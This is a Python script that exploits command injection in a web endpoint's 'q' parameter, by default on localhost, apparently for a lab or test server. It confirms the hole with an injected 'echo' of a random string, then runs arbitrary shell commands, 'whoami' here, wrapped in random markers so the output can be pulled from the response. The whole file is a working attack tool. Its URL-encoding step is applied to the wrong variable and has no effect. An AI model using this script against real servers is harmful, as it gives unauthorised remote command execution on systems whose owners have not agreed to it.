import random
import requests
import string
from html import unescape
import urllib.parse


# Configuration
address = 'http://localhost:8000/good'
parameter = 'q'
url_encode = True
verbose = True

def voutput(message):
    if verbose:
        print(f'   ? {message}')

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def preflight_request():
    # Send request
    preflight_random = random_string(16)
    preflight_echo = f"echo {preflight_random}"
    
    if url_encode:
        preflight_echo = urllib.parse.quote(preflight_echo)
    
    preflight_response = requests.get(f"{address}?{parameter}={preflight_echo}")
    
    # Validate response
    if preflight_response.status_code == 200 and preflight_random in preflight_response.text:
        return True, ''
    else:
        return False, f"Preflight request failed with status code: {preflight_response.status_code} and response: {preflight_response.text}"
    
    
def extract_markers(response_text, start_marker, end_marker):
    start_index = response_text.find(start_marker)
    end_index = response_text.find(end_marker, start_index + len(start_marker))
    
    if start_index == -1 or end_index == -1:
        return None
    
    return response_text[start_index + len(start_marker):end_index].strip()
    
def send_command(command):
    start_marker = f"--{random_string(8)}--"
    end_marker = f"--{random_string(8)}--"
    wrapped_command = f"echo {start_marker};{command};echo {end_marker}"
    
    if url_encode:
        command = urllib.parse.quote(command)
    
    url = f"{address}?{parameter}={wrapped_command}"
    voutput(f"Sending command: {url}")
    response = requests.get(url)
    
    if response.status_code != 200:
        print(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
        return None
    
    unescaped_response = unescape(response.text)
    print(f"Raw response: {unescaped_response}")
    
    return extract_markers(unescaped_response, start_marker, end_marker)



def main():
    is_successful, error_message = preflight_request()
    if is_successful:
        print("Connection successful!")
    else:
        print(f"Connection failed: {error_message}")
        return

    print(f"Command output: {send_command('whoami')}")

main()